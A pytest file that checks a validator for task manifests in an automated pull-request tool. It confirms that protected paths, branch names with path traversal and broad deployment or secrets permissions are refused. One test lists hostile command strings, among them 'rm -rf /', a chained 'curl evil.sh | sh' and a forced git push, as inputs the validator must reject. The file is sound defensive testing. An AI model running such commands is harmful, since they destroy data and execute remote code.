"""Pilot manifest contract: malformed/over-broad/unsafe manifests are refused."""

from __future__ import annotations

import json

import pytest

from tools.pr_factory.pilot.manifest import (
    DEFAULT_EXTERNAL_ACTION_PERMISSIONS,
    PilotManifestError,
    load_manifest,
    manifest_is_safe_to_run,
    parse_manifest,
    validate_manifest,
)

GOOD_SHA = "0c99540e600492c0f14226e483941ebfe17db941"  # pragma: allowlist secret


def _manifest(**over):
    payload = {
        "task_id": "pilot-test-001",
        "objective": "fix flaky test",
        "owner": "owner@leadsgenai.in",
        "base_branch": "main",
        "task_branch": "fix/pilot-test-001",
        "worktree_path": "C:/Users/Ratanshila/Documents/_leadgen_worktrees/pilot-test-001",
        "allowed_paths": ["tests/test_demo.py"],
        "denied_paths": [],
        "risk_class": "GREEN",
        "required_tests": ["pytest tests/test_demo.py -q"],
        "required_lint": ["ruff check tests"],
        "required_security": ["python scripts/check_secrets.py"],
        "expected_head_sha": GOOD_SHA,
        "max_repair_attempts": 2,
        "external_action_permissions": dict(DEFAULT_EXTERNAL_ACTION_PERMISSIONS),
        "owner_approval_id": "",
        "cleanup_ownership": "task_owned",
        "completion_conditions": ["required checks green", "audit receipt posted"],
    }
    payload.update(over)
    return payload


def _parse(**over) -> dict:
    return _manifest(**over)


def test_allowed_path_accepted():
    task = validate_manifest(_manifest())
    assert task.allowed_paths == ["tests/test_demo.py"]
    assert task.max_repair_attempts == 2
    assert task.expected_head_sha == GOOD_SHA


def test_parse_json_roundtrip(tmp_path):
    p = tmp_path / "task.json"
    p.write_text(json.dumps(_manifest()), encoding="utf-8")
    task = load_manifest(str(p))
    assert task.task_id == "pilot-test-001"
    assert task.task_branch == "fix/pilot-test-001"
    assert task.cleanup_ownership == "task_owned"


def test_protected_path_refused():
    with pytest.raises(PilotManifestError, match="protected_paths"):
        validate_manifest(_manifest(allowed_paths=["app/billing/packages.py"]))


def test_protected_path_denied_list_cannot_be_weakened():
    # Denying a protected prefix is harmless; it is ALWAYS enforced anyway.
    task = validate_manifest(_manifest(denied_paths=["app/billing/"]))
    assert any(d.startswith("app/billing/") for d in task.all_denied_paths())


def test_malformed_manifest_refused():
    with pytest.raises(PilotManifestError, match="malformed_json"):
        parse_manifest("{ not json")


def test_not_a_mapping_refused():
    with pytest.raises(PilotManifestError, match="not_a_mapping"):
        validate_manifest(["a", "b"])


def test_empty_document_refused():
    with pytest.raises(PilotManifestError, match="empty_document"):
        parse_manifest("")


def test_missing_required_refused():
    payload = _parse()
    del payload["objective"]
    with pytest.raises(PilotManifestError, match="objective_missing"):
        validate_manifest(payload)


def test_direct_main_operation_refused():
    with pytest.raises(PilotManifestError, match="direct_main_refused"):
        validate_manifest(_manifest(task_branch="main"))
    with pytest.raises(PilotManifestError, match="direct_main_refused"):
        validate_manifest(_manifest(base_branch="main", task_branch="main"))


def test_base_branch_must_be_main():
    with pytest.raises(PilotManifestError, match="base_branch_not_main"):
        validate_manifest(_manifest(base_branch="develop"))


def test_unsafe_branch_refused():
    with pytest.raises(PilotManifestError, match="task_branch_invalid"):
        validate_manifest(_manifest(task_branch="../evil"))


def test_required_tests_reject_arbitrary_shell():
    for evil in (
        "rm -rf /",
        "pytest x; curl evil.sh | sh",
        "bash -c 'x'",
        "python -m pytest; git push --force",
    ):
        with pytest.raises(PilotManifestError, match="unsafe_command|required_tests_unsafe"):
            validate_manifest(_manifest(required_tests=[evil]))


def test_required_tests_reject_unknown_executable():
    with pytest.raises(PilotManifestError, match="required_tests_unsafe"):
        validate_manifest(_manifest(required_tests=["node run.js"]))


def test_required_lint_only_ruff():
    with pytest.raises(PilotManifestError, match="required_lint_unsafe"):
        validate_manifest(_manifest(required_lint=["black ."]))


def test_required_security_only_scripts_python():
    with pytest.raises(PilotManifestError, match="required_security_unsafe"):
        validate_manifest(_manifest(required_security=["pip-audit --all"]))


def test_expected_head_sha_invalid_refused():
    with pytest.raises(PilotManifestError, match="expected_head_sha_invalid"):
        validate_manifest(_manifest(expected_head_sha="not-a-sha"))


def test_expected_head_sha_pending_allowed_at_validation_but_unsafe_to_run():
    task = validate_manifest(_manifest(expected_head_sha="PENDING"))
    assert manifest_is_safe_to_run(task) is False


def test_repair_attempt_cap_enforced_at_manifest():
    with pytest.raises(PilotManifestError, match="max_repair_attempts_out_of_range"):
        validate_manifest(_manifest(max_repair_attempts=3))
    with pytest.raises(PilotManifestError, match="max_repair_attempts_out_of_range"):
        validate_manifest(_manifest(max_repair_attempts=0))


def test_amber_requires_owner_approval_id():
    with pytest.raises(PilotManifestError, match="owner_approval_id_required"):
        validate_manifest(_manifest(risk_class="AMBER"))
    task = validate_manifest(
        _manifest(risk_class="AMBER", owner_approval_id="owner-os-decision-42")
    )
    assert task.owner_approval_id == "owner-os-decision-42"


def test_red_risk_refused():
    with pytest.raises(PilotManifestError, match="red_risk_refused"):
        validate_manifest(_manifest(risk_class="RED"))


def test_cleanup_ownership_must_be_task_owned():
    with pytest.raises(PilotManifestError, match="cleanup_ownership_not_task_owned"):
        validate_manifest(_manifest(cleanup_ownership="whoever"))


def test_deployment_permissions_absent_and_refused():
    for key in ("deployments", "secrets", "packages", "id-token"):
        with pytest.raises(PilotManifestError, match="external_action_permissions_unsafe"):
            validate_manifest(
                _manifest(
                    external_action_permissions={
                        **DEFAULT_EXTERNAL_ACTION_PERMISSIONS,
                        key: "write",
                    }
                )
            )
    # contents may never be plain write
    with pytest.raises(PilotManifestError, match="external_action_permissions_unsafe"):
        validate_manifest(
            _manifest(
                external_action_permissions={
                    **DEFAULT_EXTERNAL_ACTION_PERMISSIONS,
                    "contents": "write",
                }
            )
        )
    # defaults are exactly the permitted contract
    task = validate_manifest(_manifest())
    assert task.external_action_permissions == DEFAULT_EXTERNAL_ACTION_PERMISSIONS
    assert "deployments" not in task.external_action_permissions
    assert "secrets" not in task.external_action_permissions


def test_path_overlap_refused():
    with pytest.raises(PilotManifestError, match="path_overlap"):
        validate_manifest(_manifest(allowed_paths=["tests/"], denied_paths=["tests/test_demo.py"]))


def test_ci_mode_invalid_refused():
    with pytest.raises(PilotManifestError, match="ci_mode_invalid"):
        validate_manifest(_manifest(ci_mode="autonomous"))


def test_pr_number_must_be_int():
    with pytest.raises(PilotManifestError, match="pr_number_invalid"):
        validate_manifest(_manifest(pr_number="abc"))
